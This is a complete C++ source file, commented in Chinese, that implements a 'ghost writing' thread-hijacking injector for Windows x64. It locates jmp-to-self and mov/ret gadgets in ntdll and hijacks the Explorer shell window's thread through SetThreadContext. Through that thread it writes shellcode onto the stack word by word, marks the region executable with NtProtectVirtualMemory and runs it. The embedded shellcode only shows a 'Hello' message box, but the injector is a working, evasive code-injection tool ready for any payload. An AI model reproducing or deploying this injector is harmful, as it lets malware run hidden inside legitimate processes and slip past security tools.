#include <Windows.h>
#include <stdio.h>
#include <tchar.h>
#include "Zydis/Zydis.h"


INT EntryPoint = 0x10; // Shellcode入口偏移

BYTE Shellcode[] = {
	// 生成的shellcode有bug，会对[rsp+8]地址进行写入操作，为了避免数据被破坏，只能额外加一排全0数据
	0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,

	0x48,0x89,0x5c,0x24,0x08,0x57,0x48,0x83,0xec,0x20,0x65,0x48,0x8b,0x04,0x25,0x30,
	0x00,0x00,0x00,0x41,0xb9,0xdf,0xff,0x00,0x00,0x48,0x8b,0x48,0x60,0x48,0x8b,0x41,
	0x18,0x4c,0x8b,0x40,0x20,0x49,0x8b,0xd0,0x48,0x8b,0x12,0x48,0x8b,0x4a,0x40,0x0f,
	0xb7,0x41,0x28,0x66,0x83,0xe8,0x4b,0x66,0x41,0x85,0xc1,0x75,0x54,0x0f,0xb7,0x41,
	0x2a,0x66,0x83,0xe8,0x45,0x66,0x41,0x85,0xc1,0x75,0x46,0x0f,0xb7,0x41,0x2c,0x66,
	0x83,0xe8,0x52,0x66,0x41,0x85,0xc1,0x75,0x38,0x0f,0xb7,0x41,0x2e,0x66,0x83,0xe8,
	0x4e,0x66,0x41,0x85,0xc1,0x75,0x2a,0x0f,0xb7,0x41,0x30,0x66,0x83,0xe8,0x45,0x66,
	0x41,0x85,0xc1,0x75,0x1c,0x0f,0xb7,0x41,0x32,0x66,0x83,0xe8,0x4c,0x66,0x41,0x85,
	0xc1,0x75,0x0e,0x66,0x83,0x79,0x34,0x33,0x75,0x07,0x66,0x83,0x79,0x36,0x32,0x74,
	0x63,0x49,0x3b,0xd0,0x75,0x92,0x33,0xdb,0xba,0x5a,0xc1,0xcb,0xc2,0x48,0x8b,0xcb,
	0xe8,0x5b,0x00,0x00,0x00,0xba,0x53,0xc0,0x49,0x9c,0x48,0x8b,0xcb,0x48,0x8b,0xf8,
	0xe8,0x4b,0x00,0x00,0x00,0x48,0x8d,0x0d,0x14,0x01,0x00,0x00,0xff,0xd0,0x48,0x85,
	0xc0,0x74,0x26,0x48,0x8d,0x15,0x16,0x01,0x00,0x00,0x48,0x8b,0xc8,0xff,0xd7,0x48,
	0x85,0xc0,0x74,0x15,0x45,0x33,0xc9,0x4c,0x8d,0x05,0x12,0x01,0x00,0x00,0x48,0x8d,
	0x15,0x13,0x01,0x00,0x00,0x33,0xc9,0xff,0xd0,0x48,0x8b,0x5c,0x24,0x30,0x48,0x83,
	0xc4,0x20,0x5f,0xc3,0x48,0x8b,0x5a,0x20,0xeb,0x9e,0x00,0x00,0x00,0x00,0x00,0x00,
	0x48,0x89,0x74,0x24,0x08,0x48,0x89,0x7c,0x24,0x10,0x48,0x63,0x41,0x3c,0x4c,0x8b,
	0xc1,0x8b,0xf2,0x44,0x8b,0x94,0x08,0x88,0x00,0x00,0x00,0x4c,0x03,0xd1,0x45,0x8b,
	0x4a,0x20,0x41,0x8b,0x7a,0x1c,0x4c,0x03,0xc9,0x48,0x03,0xf9,0x33,0xc9,0x41,0x3b,
	0x4a,0x18,0x73,0x33,0x41,0x8b,0x11,0x49,0x03,0xd0,0x45,0x33,0xdb,0xeb,0x0d,0x45,
	0x6b,0xdb,0x21,0x0f,0xbe,0xc0,0x44,0x03,0xd8,0x48,0xff,0xc2,0x8a,0x02,0x84,0xc0,
	0x75,0xed,0x44,0x3b,0xde,0x74,0x0c,0xff,0xc1,0x49,0x83,0xc1,0x04,0x41,0x3b,0x4a,
	0x18,0x72,0xd1,0x41,0x3b,0x4a,0x18,0x74,0x15,0x8b,0xd1,0x41,0x8b,0x4a,0x24,0x49,
	0x03,0xc8,0x0f,0xb7,0x04,0x51,0x8b,0x04,0x87,0x49,0x03,0xc0,0xeb,0x02,0x33,0xc0,
	0x48,0x8b,0x74,0x24,0x08,0x48,0x8b,0x7c,0x24,0x10,0xc3,0x00,0x00,0x00,0x00,0x00,
	0x01,0x0a,0x04,0x00,0x0a,0x34,0x06,0x00,0x0a,0x32,0x06,0x70,0x00,0x00,0x00,0x00,
	0x00,0x00,0x00,0x00,0xfa,0x00,0x00,0x00,0x90,0x01,0x00,0x00,0x00,0x00,0x00,0x00,
	0x01,0x0a,0x04,0x00,0x0a,0x74,0x02,0x00,0x05,0x64,0x01,0x00,0x00,0x00,0x00,0x00,
	0x00,0x01,0x00,0x00,0x8b,0x01,0x00,0x00,0xb0,0x01,0x00,0x00,0x00,0x00,0x00,0x00,
	0x55,0x73,0x65,0x72,0x33,0x32,0x2e,0x64,0x6c,0x6c,0x00,0x00,0x00,0x00,0x00,0x00,
	0x4d,0x65,0x73,0x73,0x61,0x67,0x65,0x42,0x6f,0x78,0x41,0x00,0x00,0x00,0x00,0x00,
	0x4d,0x65,0x73,0x73,0x61,0x67,0x65,0x00,0x48,0x65,0x6c,0x6c,0x6f,0x00
};

struct GW {
	enum REG { None, Rbx, Rsi, Rdi, End };

	PVOID JMPTOSELFAddress;
	PVOID MOVRETAddress;

	REG Operands[2];
	INT64 Displacement; // 位移数
	INT64 PopCount; // POP计数
	INT64 RspCompensation; // RSP补偿
};

GW::REG Translate(ZydisRegister Reg) {

	switch (Reg)
	{
	case ZYDIS_REGISTER_RBX:
		return GW::Rbx;
	case ZYDIS_REGISTER_RSI:
		return GW::Rsi;
	case ZYDIS_REGISTER_RDI:
		return GW::Rdi;
	default:
		return GW::None;
	}
}

DWORD64* Translate(GW::REG Reg, CONTEXT* ThreadContext) {

	switch (Reg)
	{
	case GW::Rbx:
		return &(ThreadContext->Rbx);
	case GW::Rsi:
		return &(ThreadContext->Rsi);
	case GW::Rdi:
		return &(ThreadContext->Rdi);
	default:
		return NULL;
	}
}

BOOL FindJMPTOSELFAddress(PUCHAR NTDLLCode, DWORD NTDLLCodeSize, GW* Ghost)
{
	for (unsigned int i = 0; i < NTDLLCodeSize; i++) {
		if ((NTDLLCode[i] == 0xEB) && (NTDLLCode[i + 1] == 0xFE)) {
			Ghost->JMPTOSELFAddress = NTDLLCode + i;
			return TRUE;
		}
	}

	return FALSE;
}

BOOL FindMOVRETAddress(PUCHAR NTDLLCode, DWORD NTDLLCodeSize, GW* Ghost)
{
	ZydisDecoder Decoder;
	ZydisDecoderInit(&Decoder, ZYDIS_MACHINE_MODE_LONG_64, ZYDIS_STACK_WIDTH_64);

	ZydisDecodedInstruction Instruction;
	ZydisDecodedOperand Operands[ZYDIS_MAX_OPERAND_COUNT];

	INT MAX_INST_ALLOW_COUNT = 5; // MOVRET指令最多允许多少条指令
	PVOID Terminus = NTDLLCode + NTDLLCodeSize - MAX_INST_ALLOW_COUNT * ZYDIS_MAX_INSTRUCTION_LENGTH;

	for (PVOID RuntimeAddress = NTDLLCode; RuntimeAddress < Terminus;
		RuntimeAddress = (PVOID)((UINT_PTR)RuntimeAddress + Instruction.length)) {

		// 尝试解码
		if (ZYAN_FALSE == ZYAN_SUCCESS(ZydisDecoderDecodeFull(
			&Decoder,
			RuntimeAddress,
			ZYDIS_MAX_INSTRUCTION_LENGTH,
			&Instruction,
			Operands))) {

			// 如果解码失败则跳过当前字节
			RuntimeAddress = (PVOID)((UINT_PTR)RuntimeAddress + 1);
			continue;
		}

		// 初始化鬼写结构体
		Ghost->MOVRETAddress = 0;
		Ghost->Displacement = 0;
		Ghost->PopCount = 0;
		Ghost->RspCompensation = 0;

		//
		// 寻找符合条件的MOV指令
		//

		if (Instruction.mnemonic != ZYDIS_MNEMONIC_MOV)
			continue;

		// 要求左操作数为内存，右操作数为寄存器
		if (Operands[0].type != ZYDIS_OPERAND_TYPE_MEMORY || Operands[1].type != ZYDIS_OPERAND_TYPE_REGISTER)
			continue;

		// 检查右操作是否为非易蒸发寄存器
		if (Operands[1].reg.value != ZYDIS_REGISTER_RBX &&
			Operands[1].reg.value != ZYDIS_REGISTER_RSI &&
			Operands[1].reg.value != ZYDIS_REGISTER_RDI)
			continue;

		// 检查左操作数是否为非易蒸发寄存器
		if (Operands[0].mem.base != ZYDIS_REGISTER_RBX &&
			Operands[0].mem.base != ZYDIS_REGISTER_RSI &&
			Operands[0].mem.base != ZYDIS_REGISTER_RDI)
			continue;

		// 左操作数是否等于右操作数
		if (Operands[0].mem.base == Operands[1].reg.value)
			continue;

		// 鬼写结构体保存寄存器
		Ghost->Operands[0] = Translate(Operands[0].mem.base);
		Ghost->Operands[1] = Translate(Operands[1].reg.value);

		// 鬼写结构体保存位移
		if (Operands[0].mem.disp.has_displacement)
			Ghost->Displacement = Operands[0].mem.disp.value;

		//
		// 寻找符合条件的RET指令
		//

		PVOID PeekAddress = (PVOID)((UINT_PTR)RuntimeAddress + Instruction.length);

		for (int i = 1; i < MAX_INST_ALLOW_COUNT; i++) {

			// 如果解码失败就直接放弃
			if (ZYAN_FALSE == ZYAN_SUCCESS(ZydisDecoderDecodeFull(
				&Decoder,
				PeekAddress,
				ZYDIS_MAX_INSTRUCTION_LENGTH,
				&Instruction,
				Operands)))
				break;

			// 移动到下一条指令
			PeekAddress = (PVOID)((UINT_PTR)PeekAddress + Instruction.length);

			// 寻找 ret 指令
			if (Instruction.mnemonic == ZYDIS_MNEMONIC_RET) {

				Ghost->MOVRETAddress = RuntimeAddress;

				return TRUE;
			}

			// 允许 mov reg, ?? 指令
			else if (Instruction.mnemonic == ZYDIS_MNEMONIC_MOV) {

				// 要求左操作数为寄存器
				if (Operands[0].type != ZYDIS_OPERAND_TYPE_REGISTER)
					break;
			}

			// 允许 add rsp, ?? 指令
			else if (Instruction.mnemonic == ZYDIS_MNEMONIC_ADD) {

				// 要求左操作数为寄存器，右操作数为立即数
				if (Operands[0].type != ZYDIS_OPERAND_TYPE_REGISTER || Operands[1].type != ZYDIS_OPERAND_TYPE_IMMEDIATE)
					break;

				// 如果左操作数是rsp，则保存立即数
				if (Operands[0].reg.value == ZYDIS_REGISTER_RSP) {
					if (Operands[1].imm.is_signed)
						Ghost->RspCompensation += Operands[1].imm.value.s;
					else
						Ghost->RspCompensation += Operands[1].imm.value.u;
				}
			}

			// 允许 xor reg, ?? 指令
			else if (Instruction.mnemonic == ZYDIS_MNEMONIC_XOR) {

				// 要求左操作数为寄存器
				if (Operands[0].type != ZYDIS_OPERAND_TYPE_REGISTER)
					break;
			}

			// 允许 pop reg 指令
			else if (Instruction.mnemonic == ZYDIS_MNEMONIC_POP) {

				Ghost->PopCount += 1;
			}

			// 不接受其他指令
			else {
				break;
			}
		}
	}

	return FALSE;
}

BOOL GhostWrite(HANDLE Thread, HWND Window, CONTEXT* ThreadContext, PVOID JMPTOSELFAddress)
{
	SetThreadContext(Thread, ThreadContext);

#ifdef DEBUG
	_tprintf(_T("\n"));
	_tprintf(_T("[D] After inject:\n"));
	_tprintf(_T("[D] Rbx = %llX\n"), ThreadContext->Rbx);
	_tprintf(_T("[D] Rsi = %llX\n"), ThreadContext->Rsi);
	_tprintf(_T("[D] Rdi = %llX\n"), ThreadContext->Rdi);
	_tprintf(_T("[D] Rsp = %llX\n"), ThreadContext->Rsp);
	_tprintf(_T("[D] Rip = %llX\n"), ThreadContext->Rip);
#endif // DEBUG

	// 唤醒线程
	PostMessage(Window, WM_USER, 0, 0);
	PostMessage(Window, WM_USER, 0, 0);
	PostMessage(Window, WM_USER, 0, 0);

	do {
		ResumeThread(Thread);
		Sleep(10);
		SuspendThread(Thread);

		if (GetThreadContext(Thread, ThreadContext) == 0) {
			_tprintf(_T("[x] GetThreadContext failed, error: 0x%x\n"), GetLastError());
			return FALSE;
		}
		
	} while ((PVOID)ThreadContext->Rip != JMPTOSELFAddress);

	return TRUE;
}

BOOL Inject(HANDLE Thread, HWND Window, GW* Ghost, PVOID NtProtectVirtualMemory)
{
	// 获取当前线程上下文
	CONTEXT ThreadContext;
	ThreadContext.ContextFlags = CONTEXT_FULL;
	GetThreadContext(Thread, &ThreadContext);

	// 设置左操作数
	DWORD64* Operand0 = Translate(Ghost->Operands[0], &ThreadContext);
	if (Operand0 == NULL) {
		_tprintf(_T("[x] Unsupported operand, Operands[0]: %d\n"), Ghost->Operands[0]);
		return FALSE;
	}

	// 设置右操作数
	DWORD64* Operand1 = Translate(Ghost->Operands[1], &ThreadContext);
	if (Operand1 == NULL) {
		_tprintf(_T("[x] Unsupported operand, Operands[1]: %d\n"), Ghost->Operands[1]);
		return FALSE;
	}

	//
	// 计算栈空间大小
	//

	// 预留JMPTOSELFAddress地址空间
	INT BytesOfJmpToSelfAddress = sizeof(PVOID);

	// 预留NtProtectVirtualMemory参数空间
	INT BytesOfNtProtectVirtualMemoryCallFrame = (5 + 3) * sizeof(PVOID);

	// 预留Shellcode空间
	INT BytesOfShellcode = sizeof(Shellcode);

	// Shellcode和NtProtectVirtualMemory调用帧栈共用一块内存，所以取两者最大值
	if (BytesOfShellcode < BytesOfNtProtectVirtualMemoryCallFrame)
		BytesOfShellcode = BytesOfNtProtectVirtualMemoryCallFrame;

	// 取 sizeof(PVOID) 的整数倍值
	BytesOfShellcode = BytesOfShellcode - (BytesOfShellcode % sizeof(PVOID)) + sizeof(PVOID);

	// 计算RSP栈顶位置，这里的栈顶包含了RSP和POP补偿偏移
	DWORD64 StackTopAddress = ThreadContext.Rsp
		- BytesOfJmpToSelfAddress
		- BytesOfShellcode
		- Ghost->RspCompensation				// 补偿RSP
		- (Ghost->PopCount * sizeof(PVOID));	// 补偿POP

	// 栈内存16字节对齐
	StackTopAddress = StackTopAddress - (StackTopAddress % 16);

	//
	// 第一步：RSP顶端写入JMPTOSELFAddress地址
	//

	// 重置RSP
	ThreadContext.Rsp = StackTopAddress;

	// 源寄存器储存将要写入的数据
	*Operand1 = (DWORD64)Ghost->JMPTOSELFAddress;

	// 目的寄存器储存将要写入的地址
	*Operand0 = ThreadContext.Rsp
		+ Ghost->RspCompensation				// 平衡RSP的补偿
		+ (Ghost->PopCount * sizeof(PVOID))		// 平衡POP的补偿
		- Ghost->Displacement;					// 修正MOV指令中的位移地址

	// RIP指向MOVRETAddress
	ThreadContext.Rip = (DWORD64)Ghost->MOVRETAddress;

	// 写入数据
	if (GhostWrite(Thread, Window, &ThreadContext, Ghost->JMPTOSELFAddress) == FALSE)
		return FALSE;

	//
	// 第二步：写入NtProtectVirtualMemory参数
	//

	// 重置RSP
	ThreadContext.Rsp = StackTopAddress;

	// 这是个fastcall调用约定的函数，传参顺序 RCX RDX R8 R9，OldAccessProtection参数使用压栈传递
	//
	// NtProtectVirtualMemory 函数声明如下：
	//
	// NTSTATUS NtProtectVirtualMemory(
	//		HANDLE ProcessHandle,
	//		PVOID* BaseAddress,
	//		SIZE_T* NumberOfBytesToProtect,
	//		ULONG NewAccessProtection,
	//		PULONG OldAccessProtection);

	DWORD64 NtProtectVirtualMemoryCallFrame[5 + 3] = { // 这里 5+3 如果有改动，前面的BytesOfNtProtectVirtualMemoryCallFrame别忘了改掉

		(DWORD64)-1,						// 栈帧：参数 ProcessHandle

		ThreadContext.Rsp					// 栈帧：参数 *BaseAddress，注意这是一个二级指针，指向临时指针 BaseAddress
			+ BytesOfJmpToSelfAddress
			+ ((5 + 0) * sizeof(PVOID))
			+ Ghost->RspCompensation
			+ (Ghost->PopCount * sizeof(PVOID)),
		
		ThreadContext.Rsp					// 栈帧：参数 NumberOfBytesToProtect，注意这是一个指针，指向临时变量 NumberOfBytesToProtect
			+ BytesOfJmpToSelfAddress
			+ ((5 + 1) * sizeof(PVOID))
			+ Ghost->RspCompensation
			+ (Ghost->PopCount * sizeof(PVOID)),
		
		PAGE_EXECUTE_READWRITE,				// 栈帧：参数 NewAccessProtection

		ThreadContext.Rsp					// 栈帧：参数 OldAccessProtection，注意这是一个指针，指向临时变量 OldAccessProtection
			+ BytesOfJmpToSelfAddress
			+ ((5 + 2) * sizeof(PVOID))
			+ Ghost->RspCompensation
			+ (Ghost->PopCount * sizeof(PVOID)),

		ThreadContext.Rsp					// 临时指针 BaseAddress：指向Shellcode区域
			+ BytesOfJmpToSelfAddress
			+ Ghost->RspCompensation
			+ (Ghost->PopCount * sizeof(PVOID)),
		
		(DWORD64)BytesOfShellcode,			// 临时变量 NumberOfBytesToProtect：内存保护的大小
		
		0									// 临时变量 OldAccessProtection：储存原内存权限
	};

	for (int i = 0; i < sizeof(NtProtectVirtualMemoryCallFrame) / sizeof(NtProtectVirtualMemoryCallFrame[0]); i++) {

		// 重置RSP
		ThreadContext.Rsp = StackTopAddress;

		// 源寄存器储存将要写入的数据
		*Operand1 = NtProtectVirtualMemoryCallFrame[i];

		// 目的寄存器储存将要写入的地址
		*Operand0 = ThreadContext.Rsp
			+ BytesOfJmpToSelfAddress
			+ i * sizeof(PVOID)
			+ Ghost->RspCompensation				// 平衡RSP的补偿
			+ (Ghost->PopCount * sizeof(PVOID))		// 平衡POP的补偿
			- Ghost->Displacement;					// 修正MOV指令中的位移地址

		// RIP指向MOVRETAddress
		ThreadContext.Rip = (DWORD64)Ghost->MOVRETAddress;

		// 写入数据
		if(GhostWrite(Thread, Window, &ThreadContext, Ghost->JMPTOSELFAddress) == FALSE)
			return FALSE;
	}

	//
	// 第三步：执行NtProtectVirtualMemory
	//

	// fastcall参数设置 栈帧：参数 ProcessHandle
	ThreadContext.Rcx = NtProtectVirtualMemoryCallFrame[0];

	// fastcall参数设置 栈帧：参数 *BaseAddress，注意这是一个二级指针，指向临时指针 BaseAddress
	ThreadContext.Rdx = NtProtectVirtualMemoryCallFrame[1];

	// fastcall参数设置 栈帧：参数 NumberOfBytesToProtect，注意这是一个指针，指向临时变量 NumberOfBytesToProtect
	ThreadContext.R8 = NtProtectVirtualMemoryCallFrame[2];

	// fastcall参数设置 栈帧：参数 NewAccessProtection
	ThreadContext.R9 = NtProtectVirtualMemoryCallFrame[3];

	// 重置RSP
	ThreadContext.Rsp = StackTopAddress;

	// 将RSP对准JMPTOSELFAddress
	ThreadContext.Rsp = ThreadContext.Rsp
		+ Ghost->RspCompensation				// 平衡RSP的补偿
		+ (Ghost->PopCount * sizeof(PVOID));	// 平衡POP的补偿

	// RIP指向NtProtectVirtualMemory
	ThreadContext.Rip = (DWORD64)NtProtectVirtualMemory;

	// 写入数据
	if (GhostWrite(Thread, Window, &ThreadContext, Ghost->JMPTOSELFAddress) == FALSE)
		return FALSE;

	//
	// 第四步：写入Shellcode
	//

	for (int i = 0; i < BytesOfShellcode / sizeof(PVOID); i++) {

		// 重置RSP
		ThreadContext.Rsp = StackTopAddress;

		// 源寄存器储存将要写入的数据
		*Operand1 = ((DWORD64*)Shellcode)[i];

		// 目的寄存器储存将要写入的地址
		*Operand0 = ThreadContext.Rsp
			+ BytesOfJmpToSelfAddress
			+ i * sizeof(PVOID)
			+ Ghost->RspCompensation				// 平衡RSP的补偿
			+ (Ghost->PopCount * sizeof(PVOID))		// 平衡POP的补偿
			- Ghost->Displacement;					// 修正MOV指令中的位移地址

		// RIP指向MOVRETAddress
		ThreadContext.Rip = (DWORD64)Ghost->MOVRETAddress;

		// 写入数据
		if(GhostWrite(Thread, Window, &ThreadContext, Ghost->JMPTOSELFAddress) == FALSE)
			return FALSE;
	}

	//
	// 第五步：执行Shellcode
	//

	// 重置RSP
	ThreadContext.Rsp = StackTopAddress;

	// RIP指向Shellcode
	ThreadContext.Rip = ThreadContext.Rsp
		+ BytesOfJmpToSelfAddress
		+ EntryPoint							// Shellcode入口偏移
		+ Ghost->RspCompensation				// 平衡RSP的补偿
		+ (Ghost->PopCount * sizeof(PVOID));	// 平衡POP的补偿

	// 将RSP对准JMPTOSELFAddress
	ThreadContext.Rsp = ThreadContext.Rsp
		+ Ghost->RspCompensation				// 平衡RSP的补偿
		+ (Ghost->PopCount * sizeof(PVOID));	// 平衡POP的补偿

	// 写入数据
	if (GhostWrite(Thread, Window, &ThreadContext, Ghost->JMPTOSELFAddress) == FALSE)
		return FALSE;

	return TRUE; // 约定：注入完成后线程必须处于暂停状态
}

int _tmain(int argc, TCHAR* argv[])
{
	// 获取ntdll模块
	HMODULE NTDLLBase = GetModuleHandle(_T("ntdll.dll"));
	if (NTDLLBase != NULL) {
		_tprintf(_T("[+] NTDLLBase = %p\n"), NTDLLBase);
	}
	else{
		_tprintf(_T("[x] Failed to get ntdll.dll module\n"));
		return 0;
	}

	// 获取ntdll的.text段地址，以及.text段大小
	PUCHAR NTDLLCode = (PUCHAR)((UINT_PTR)NTDLLBase + 0x1000);
	PIMAGE_NT_HEADERS NTDLLPEHeader = (PIMAGE_NT_HEADERS)((UINT_PTR)NTDLLBase + ((IMAGE_DOS_HEADER*)NTDLLBase)->e_lfanew);
	DWORD NTDLLCodeSize = NTDLLPEHeader->OptionalHeader.SizeOfCode;

	// 获取NtProtectVirtualMemory的函数地址
	PVOID NtProtectVirtualMemory = (PVOID)GetProcAddress(NTDLLBase, "NtProtectVirtualMemory");
	if (NtProtectVirtualMemory == NULL) {
		_tprintf(_T("[x] Can't get NtProtectVirtualMemory address\n"));
		return 0;
	}

	// 鬼写结构体
	GW Ghost;

	// 获取自跳转地址
	if (FindJMPTOSELFAddress(NTDLLCode, NTDLLCodeSize, &Ghost) == TRUE) {
		_tprintf(_T("[+] JMP SELF Address = %p\n"), Ghost.JMPTOSELFAddress);
	}
	else {
		_tprintf(_T("[x] Failed to find JMP SELF Address\n"));
		return 0;
	}

	// 获取转移返回地址
	if (FindMOVRETAddress(NTDLLCode, NTDLLCodeSize, &Ghost) == TRUE) {
		_tprintf(_T("[+] MOV RET Address = %p\n"), Ghost.MOVRETAddress);
	}
	else {
		_tprintf(_T("[x] Failed to find MOV RET Address\n"));
		return 0;
	}

	// 打开线程
	// HWND Window = FindWindow(_T("CalcFrame"), NULL);
	HWND Window = GetShellWindow();
	if (Window == NULL) {
		_tprintf(_T("[x] Can't find target window\n"));
		return 0;
	}

	DWORD ThreadId = GetWindowThreadProcessId(Window, NULL);
	_tprintf(_T("[+] ThreadId = %d\n"), ThreadId);

	HANDLE Thread = OpenThread(THREAD_SET_CONTEXT | THREAD_GET_CONTEXT | THREAD_SUSPEND_RESUME, FALSE, ThreadId);
	if (Thread == NULL) {
		_tprintf(_T("[x] Can't open target thread\n"));
		return 0;
	}

	// 暂停线程
	SuspendThread(Thread);

	// 保存线程上下文，用于还原
	CONTEXT ThreadContext;
	ThreadContext.ContextFlags = CONTEXT_FULL;
	GetThreadContext(Thread, &ThreadContext);

#ifdef DEBUG
	_tprintf(_T("\n"));
	_tprintf(_T("[D] Before inject:\n"));
	_tprintf(_T("[D] Rbx = %llX\n"), ThreadContext.Rbx);
	_tprintf(_T("[D] Rsi = %llX\n"), ThreadContext.Rsi);
	_tprintf(_T("[D] Rdi = %llX\n"), ThreadContext.Rdi);
	_tprintf(_T("[D] Rsp = %llX\n"), ThreadContext.Rsp);
	_tprintf(_T("[D] Rip = %llX\n"), ThreadContext.Rip);
#endif // DEBUG

	// 开始注入，约定：注入完成后线程必须处于暂停状态
	if (Inject(Thread, Window, &Ghost, NtProtectVirtualMemory) == TRUE) {
		_tprintf(_T("[+] Inject success\n"));
	}
	else {
		_tprintf(_T("[-] Inject failed\n"));
	}

	// 还原线程
	SetThreadContext(Thread, &ThreadContext);
	ResumeThread(Thread);

	// 唤醒线程
	PostMessage(Window, WM_USER, 0, 0);

	CloseHandle(Thread);
	return 0;
}
